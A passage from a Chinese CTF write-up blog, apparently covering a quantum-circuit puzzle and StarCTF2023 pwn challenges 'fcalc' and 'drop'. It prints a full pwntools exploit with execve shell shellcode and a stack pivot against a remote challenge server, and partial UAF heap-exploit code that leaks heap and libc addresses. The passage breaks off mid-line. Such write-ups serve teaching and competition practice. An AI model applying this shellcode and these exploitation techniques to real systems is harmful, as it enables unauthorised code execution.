<h2 id="output"><a href="#output" class="headerlink" title="output"></a>output</h2><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Suppose the quantum circuit <span class="built_in">is</span> named <span class="string">&quot;qc&quot;</span>, the quantum operations are <span class="keyword">as</span> follows:</span><br><span class="line"></span><br><span class="line"><span class="symbol">X:</span> bit-flip gate e.g. <span class="string">&quot;qc.x(1)&quot;</span> means flipping qubit <span class="number">1</span>;</span><br><span class="line"><span class="symbol">H:</span> Hadamard gate e.g. <span class="string">&quot;qc.h(1)&quot;</span> means make the Hadamard transfomation <span class="keyword">on</span> qubit <span class="number">1</span>;</span><br><span class="line"><span class="symbol">I:</span> Identity gate e.g. <span class="string">&quot;qc.i(1)&quot;</span>;</span><br><span class="line">CNOT gate: e.g. <span class="string">&quot;qc.cx(0,1)&quot;</span> means <span class="string">&quot;q[1]=(q[1]+q[0]) mod 2&quot;</span>;</span><br><span class="line">Toffoli gate: e.g. <span class="string">&quot;qc.ccx(0,1,2)&quot;</span> means <span class="string">&quot;q[2]=(q[2]+q[1]*q[0]) mod 2&quot;</span>.</span><br><span class="line"><span class="symbol">Measure:</span> e.g. <span class="string">&quot;qc.measure(1,0)&quot;</span> means measure the qubit <span class="number">1</span> <span class="built_in">and</span> store the measured result <span class="keyword">into</span> classical bit <span class="number">0</span>.</span><br><span class="line"></span><br><span class="line">You can <span class="keyword">get</span> more details <span class="keyword">in</span> <span class="string">&quot;demo&quot;</span>.</span><br></pre></td></tr></table></figure>
<p>附图：</p>
<img src="/2023/08/08/%E5%9B%BD%E8%B5%9B-%E5%86%B3%E8%B5%9B2023/circuit_2.png" class title="circuit_2"> 
<p>这道题目的关键就是 <code>matplotlib.pyplot</code> 模块</p>
<p>有了该模块进行可视化，很快就可以求出答案，完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiskit <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> qiskit.visualization <span class="keyword">import</span> plot_histogram</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">simulator = Aer.get_backend(<span class="string">&#x27;qasm_simulator&#x27;</span>)</span><br><span class="line">qc = QuantumCircuit(<span class="number">36</span>,<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">qc.x(<span class="number">0</span>)</span><br><span class="line">qc.x(<span class="number">1</span>)</span><br><span class="line">qc.i(<span class="number">2</span>)</span><br><span class="line">qc.x(<span class="number">3</span>)</span><br><span class="line">qc.x(<span class="number">4</span>)</span><br><span class="line">qc.x(<span class="number">5</span>)</span><br><span class="line">qc.i(<span class="number">6</span>)</span><br><span class="line">qc.x(<span class="number">7</span>)</span><br><span class="line">qc.x(<span class="number">8</span>)</span><br><span class="line">qc.x(<span class="number">9</span>)</span><br><span class="line">qc.i(<span class="number">10</span>)</span><br><span class="line">qc.x(<span class="number">11</span>)</span><br><span class="line">qc.i(<span class="number">12</span>)</span><br><span class="line">qc.x(<span class="number">13</span>)</span><br><span class="line">qc.i(<span class="number">14</span>)</span><br><span class="line">qc.x(<span class="number">15</span>)</span><br><span class="line">qc.i(<span class="number">16</span>)</span><br><span class="line">qc.x(<span class="number">17</span>)</span><br><span class="line">qc.i(<span class="number">18</span>)</span><br><span class="line">qc.i(<span class="number">19</span>)</span><br><span class="line"></span><br><span class="line">qc.h(<span class="number">0</span>)</span><br><span class="line">qc.h(<span class="number">1</span>)</span><br><span class="line">qc.h(<span class="number">2</span>)</span><br><span class="line">qc.h(<span class="number">3</span>)</span><br><span class="line">qc.h(<span class="number">4</span>)</span><br><span class="line">qc.h(<span class="number">5</span>)</span><br><span class="line">qc.h(<span class="number">6</span>)</span><br><span class="line">qc.h(<span class="number">7</span>)</span><br><span class="line">qc.h(<span class="number">8</span>)</span><br><span class="line">qc.h(<span class="number">9</span>)</span><br><span class="line">qc.h(<span class="number">10</span>)</span><br><span class="line">qc.h(<span class="number">11</span>)</span><br><span class="line">qc.h(<span class="number">12</span>)</span><br><span class="line">qc.h(<span class="number">13</span>)</span><br><span class="line">qc.h(<span class="number">14</span>)</span><br><span class="line">qc.h(<span class="number">15</span>)</span><br><span class="line">qc.h(<span class="number">16</span>)</span><br><span class="line">qc.h(<span class="number">17</span>)</span><br><span class="line">qc.h(<span class="number">18</span>)</span><br><span class="line">qc.h(<span class="number">19</span>)</span><br><span class="line"></span><br><span class="line">qc.ccx(<span class="number">3</span>,<span class="number">7</span>,<span class="number">21</span>)</span><br><span class="line">qc.ccx(<span class="number">15</span>,<span class="number">16</span>,<span class="number">22</span>)</span><br><span class="line">qc.ccx(<span class="number">2</span>,<span class="number">6</span>,<span class="number">23</span>)</span><br><span class="line">qc.ccx(<span class="number">12</span>,<span class="number">13</span>,<span class="number">24</span>)</span><br><span class="line">qc.ccx(<span class="number">10</span>,<span class="number">11</span>,<span class="number">25</span>)</span><br><span class="line">qc.ccx(<span class="number">0</span>,<span class="number">14</span>,<span class="number">26</span>)</span><br><span class="line">qc.ccx(<span class="number">1</span>,<span class="number">5</span>,<span class="number">27</span>)</span><br><span class="line">qc.ccx(<span class="number">8</span>,<span class="number">9</span>,<span class="number">28</span>)</span><br><span class="line">qc.ccx(<span class="number">0</span>,<span class="number">4</span>,<span class="number">29</span>)</span><br><span class="line">qc.ccx(<span class="number">5</span>,<span class="number">11</span>,<span class="number">30</span>)</span><br><span class="line">qc.cx(<span class="number">21</span>,<span class="number">24</span>)</span><br><span class="line">qc.x(<span class="number">27</span>)</span><br><span class="line">qc.ccx(<span class="number">4</span>,<span class="number">30</span>,<span class="number">31</span>)</span><br><span class="line">qc.cx(<span class="number">24</span>,<span class="number">25</span>)</span><br><span class="line">qc.cx(<span class="number">27</span>,<span class="number">30</span>)</span><br><span class="line">qc.ccx(<span class="number">4</span>,<span class="number">11</span>,<span class="number">31</span>)</span><br><span class="line">qc.ccx(<span class="number">23</span>,<span class="number">24</span>,<span class="number">26</span>)</span><br><span class="line">qc.ccx(<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>)</span><br><span class="line">qc.ccx(<span class="number">30</span>,<span class="number">32</span>,<span class="number">34</span>)</span><br><span class="line">qc.cx(<span class="number">29</span>,<span class="number">31</span>)</span><br><span class="line">qc.cx(<span class="number">17</span>,<span class="number">34</span>)</span><br><span class="line">qc.cx(<span class="number">31</span>,<span class="number">33</span>)</span><br><span class="line">qc.ccx(<span class="number">18</span>,<span class="number">34</span>,<span class="number">35</span>)</span><br><span class="line">qc.x(<span class="number">33</span>)</span><br><span class="line">qc.ccx(<span class="number">34</span>,<span class="number">31</span>,<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">qc.measure([<span class="number">35</span>,<span class="number">33</span>,<span class="number">34</span>],[<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">job = execute(qc, simulator, shots=<span class="number">100000</span>)</span><br><span class="line"><span class="comment"># Grab results from the job</span></span><br><span class="line">result = job.result()</span><br><span class="line"><span class="comment"># Returns counts</span></span><br><span class="line">counts = result.get_counts(qc)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nTotal count for 00 and 11 are:&quot;</span>,counts)</span><br><span class="line"><span class="comment"># Plot a histogram</span></span><br><span class="line">plot_histogram(counts)</span><br><span class="line"><span class="comment"># Draw the circuit</span></span><br><span class="line">qc.draw(output=<span class="string">&#x27;mpl&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<h2 id="Glass"><a href="#Glass" class="headerlink" title="Glass"></a>Glass</h2><p>从32x32的像素点中选择10个，基数很小可以直接爆破</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/01/StarCTF2023/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/08/01/StarCTF2023/" class="post-title-link" itemprop="url">StarCTF2023</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-08-01 15:28:12 / Modified: 15:29:35" itemprop="dateCreated datePublished" datetime="2023-08-01T15:28:12+08:00">2023-08-01</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>13k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>12 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="fcalc"><a href="#fcalc" class="headerlink" title="fcalc"></a>fcalc</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fcalc: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">05285b</span>cf7cd192619ab73f7c8e90e4e0d357c11c, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">   Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">   RELRO:    Full RELRO</span><br><span class="line">   Stack:    No canary found</span><br><span class="line">   NX:       NX disabled</span><br><span class="line">   PIE:      PIE enabled</span><br><span class="line">   RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Full RELRO，PIE</li>
</ul>
<p><strong>程序分析</strong></p>
<p>程序大致上实现了一个计算器，输入数字可以将数字压栈，输入运算符号 <code>+-*/</code> 可以从栈中弹出栈顶的两个数字，进行运算后将结果压回</p>
<p><strong>入侵思路</strong></p>
<p>关键点就是在栈上注入一个 shellcode，需要通过下面的检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">0x2F</span>; ++j )</span><br><span class="line">&#123;</span><br><span class="line">  doublet = <span class="built_in">fabs</span>(*(<span class="keyword">double</span> *)ptr);</span><br><span class="line">  <span class="keyword">if</span> ( doublet != <span class="number">0.0</span> &amp;&amp; (doublet &lt; <span class="number">1.0</span> || doublet &gt; <span class="number">100.0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ERROR: %lf\n&quot;</span>, doublet);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ptr += <span class="number">8</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当然不可能整个 shellcode 都通过检查，通过 GDB 调试可以发现栈上有个栈地址，于是需要写一个 <code>add rsp,offset;ret;</code> 跳转到这个栈地址上，在这里布置 shellcode</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./fcalc&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="string">&#x27;49628&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1876)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendNum</span>(<span class="params">num</span>):</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendKey</span>(<span class="params">key</span>):</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.send(key)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\x48\x31\xC0\x48\x31\xF6\x48\x31\xD2\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">sendKey(payload.ljust(<span class="number">0x40</span>,<span class="string">&quot;\x00&quot;</span>)+p64(<span class="number">0x40000000d0ec8148</span>)*<span class="number">24</span>+p64(<span class="number">0x40000000d0ec8148</span>)+p64(<span class="number">0x40000000d0ec8148</span>)+p64(<span class="number">0x3ff00000000000c3</span>))</span><br><span class="line"></span><br><span class="line">sendKey(<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;/&#x27;</span>)+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="drop"><a href="#drop" class="headerlink" title="drop"></a>drop</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">drop: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">3b</span>db633ba28af9d5592d174f3b181e4b5485e8db, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Full RELRO，NX，PIE</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>这个题的伪代码有点怪，正常分析程序功能有点困难，需要根据输入的内容来判断程序各个模块对堆的影响</p>
<p>我一般遇到这种难以分析的题目都会直接开始调试：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">for</span> i in <span class="title">range</span><span class="params">(<span class="number">9</span>)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">add</span><span class="params">(str(i+<span class="number">1</span>)*<span class="number">0x200</span>)</span></span></span><br><span class="line"><span class="function">        </span></span><br><span class="line"><span class="function"><span class="title">bubble</span><span class="params">(<span class="number">0</span>,<span class="number">1</span>)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x20</span> [  <span class="number">1</span>]: <span class="number">0x5555555ad9e0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span> [  <span class="number">1</span>]: <span class="number">0x5555555ab910</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span> [  <span class="number">1</span>]: <span class="number">0x5555555ada00</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span> [  <span class="number">1</span>]: <span class="number">0x5555555ab480</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0xd0</span> [  <span class="number">1</span>]: <span class="number">0x5555555ae2b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x1e0</span> [  <span class="number">1</span>]: <span class="number">0x5555555ab2a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x210</span> [  <span class="number">2</span>]: <span class="number">0x5555555afa10</span> —▸ <span class="number">0x5555555ada70</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x5555555aef50</span> —▸ <span class="number">0x7ffff7f61be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x5555555aef50</span></span><br></pre></td></tr></table></figure>
<ul>
<li>这里大概推测一下，函数 <code>bubble</code> 的功能如下：<ul>
<li>当 key 为0时，释放第 index 个 chunk</li>
<li>当 key 为1时，将前 index 个 chunk 全部释放，申请并拷贝到新的 chunk 中</li>
</ul>
</li>
</ul>
<p>程序的 <code>bubble</code> 可以用于释放堆块，在其中有 UAF 漏洞</p>
<p><strong>入侵思路</strong></p>
<p>利用 UAF 漏洞可以完成泄露：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">for</span> i in <span class="title">range</span><span class="params">(<span class="number">9</span>)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">add</span><span class="params">(str(i+<span class="number">1</span>)*<span class="number">0x200</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">bubble</span><span class="params">(<span class="number">0</span>,<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">show</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">ru</span><span class="params">(<span class="string">&quot;The 1th item: \n&quot;</span>)</span></span></span><br><span class="line"><span class="function">leak_addr </span>= u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x2a70</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+hex(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+hex(heap_base))</span><br><span class="line"></span><br><span class="line">bubble(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">ru(<span class="string">&quot;The 8th item: \n&quot;</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ecbe0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+hex(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; 